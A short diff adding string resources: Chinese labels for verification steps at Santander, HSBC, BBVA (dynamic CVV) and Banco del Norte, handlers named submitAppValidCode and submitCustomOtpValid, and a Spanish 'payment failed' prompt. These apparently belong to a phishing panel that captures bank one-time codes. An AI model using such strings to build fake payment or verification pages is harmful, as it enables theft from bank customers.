@@ -1,0 +1,10 @@
+VNUmpvhrfN
+ww_gb_Ticket_temp3
+桑坦德8位
+北方验证
+HSBC验证
+BBVA动态CVV
+自定义APP验证
+submitAppValidCode
+submitCustomOtpValid
+Pago agotado, por favor realice el pago con la tarjeta del Banco del Norte.
